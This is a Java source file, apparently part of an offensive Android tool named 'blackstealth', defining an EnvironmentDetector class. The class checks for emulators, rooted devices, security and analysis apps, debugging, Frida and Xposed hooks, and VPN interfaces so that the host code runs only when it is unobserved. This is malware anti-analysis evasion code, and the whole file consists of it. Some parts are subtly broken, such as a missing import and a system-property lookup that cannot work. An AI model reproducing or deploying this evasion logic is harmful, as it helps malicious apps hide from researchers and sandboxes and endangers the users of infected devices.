package com.offensive.blackstealth.stealth;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import java.io.File;
import java.net.NetworkInterface;
import java.util.*;

/**
 * EnvironmentDetector - Detects analysis environments, emulators, and security tools
 */
public class EnvironmentDetector {
    private static final String TAG = "EnvironmentDetector";
    
    private Context context;
    
    public EnvironmentDetector(Context context) {
        this.context = context;
    }
    
    /**
     * Comprehensive environment check
     */
    public boolean isSafeEnvironment() {
        return !isEmulator() && !isRooted() && !hasSecurityApps() && 
               !isDebuggable() && !hasHooks() && !isVpnActive();
    }
    
    /**
     * Detect if running on emulator
     */
    public boolean isEmulator() {
        // Check build properties
        if (Build.FINGERPRINT.contains("generic") ||
            Build.MODEL.contains("google_sdk") ||
            Build.MODEL.contains("Emulator") ||
            Build.MODEL.contains("Android SDK") ||
            Build.MANUFACTURER.contains("Genymotion") ||
            Build.HARDWARE.contains("goldfish") ||
            Build.HARDWARE.contains("ranchu") ||
            Build.PRODUCT.contains("sdk") ||
            Build.PRODUCT.contains("vbox86p")) {
            return true;
        }
        
        // Check for emulator files
        String[] emulatorFiles = {
            "/dev/socket/qemud",
            "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/system/bin/qemu-props"
        };
        
        for (String file : emulatorFiles) {
            if (new File(file).exists()) {
                return true;
            }
        }
        
        // Check for emulator-specific properties
        try {
            String qemu = System.getProperty("ro.kernel.qemu");
            if ("1".equals(qemu)) return true;
        } catch (Exception e) {}
        
        return false;
    }
    
    /**
     * Detect if device is rooted
     */
    public boolean isRooted() {
        String[] rootPaths = {
            "/system/app/Superuser.apk",
            "/system/xbin/su",
            "/system/bin/su",
            "/sbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/data/local/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/system/app/SuperSU.apk"
        };
        
        for (String path : rootPaths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        
        // Check for root management apps
        String[] rootApps = {
            "com.noshufou.android.su",
            "com.thirdparty.superuser",
            "eu.chainfire.supersu",
            "com.koushikdutta.superuser",
            "com.topjohnwu.magisk"
        };
        
        PackageManager pm = context.getPackageManager();
        for (String app : rootApps) {
            try {
                pm.getPackageInfo(app, 0);
                return true;
            } catch (PackageManager.NameNotFoundException e) {}
        }
        
        return false;
    }
    
    /**
     * Detect security/analysis apps
     */
    public boolean hasSecurityApps() {
        String[] securityApps = {
            "de.robv.android.xposed.installer",
            "com.saurik.substrate",
            "de.robv.android.xposed",
            "org.honeynet.droidbox",
            "com.android.vending.billing.InAppBillingService.COIN",
            "org.chickenhook",
            "com.fuzhu8.inspector"
        };
        
        PackageManager pm = context.getPackageManager();
        for (String app : securityApps) {
            try {
                pm.getPackageInfo(app, 0);
                return true;
            } catch (PackageManager.NameNotFoundException e) {}
        }
        
        return false;
    }
    
    /**
     * Check if app is debuggable
     */
    public boolean isDebuggable() {
        return (context.getApplicationInfo().flags & 
                android.content.pm.ApplicationInfo.FLAG_DEBUGGABLE) != 0;
    }
    
    /**
     * Detect hooking frameworks
     */
    public boolean hasHooks() {
        try {
            throw new Exception("Hook check");
        } catch (Exception e) {
            for (StackTraceElement element : e.getStackTrace()) {
                String className = element.getClassName();
                if (className.contains("xposed") || 
                    className.contains("substrate") ||
                    className.contains("frida")) {
                    return true;
                }
            }
        }
        
        // Check for Frida
        String[] fridaIndicators = {
            "frida-server",
            "frida-agent",
            "frida-gadget"
        };
        
        try {
            Set<String> libraries = new HashSet<>();
            BufferedReader reader = new java.io.BufferedReader(
                new java.io.FileReader("/proc/self/maps"));
            String line;
            while ((line = reader.readLine()) != null) {
                for (String indicator : fridaIndicators) {
                    if (line.contains(indicator)) {
                        return true;
                    }
                }
            }
            reader.close();
        } catch (Exception e) {}
        
        return false;
    }
    
    /**
     * Check if VPN is active (might indicate traffic analysis)
     */
    public boolean isVpnActive() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface ni = interfaces.nextElement();
                if (ni.isUp() && (ni.getName().contains("tun") || 
                    ni.getName().contains("ppp"))) {
                    return true;
                }
            }
        } catch (Exception e) {}
        
        return false;
    }
    
    /**
     * Get detailed environment info for logging
     */
    public Map<String, Object> getEnvironmentInfo() {
        Map<String, Object> info = new HashMap<>();
        info.put("isEmulator", isEmulator());
        info.put("isRooted", isRooted());
        info.put("hasSecurityApps", hasSecurityApps());
        info.put("isDebuggable", isDebuggable());
        info.put("hasHooks", hasHooks());
        info.put("isVpnActive", isVpnActive());
        info.put("isSafe", isSafeEnvironment());
        info.put("model", Build.MODEL);
        info.put("sdk", Build.VERSION.SDK_INT);
        return info;
    }
}
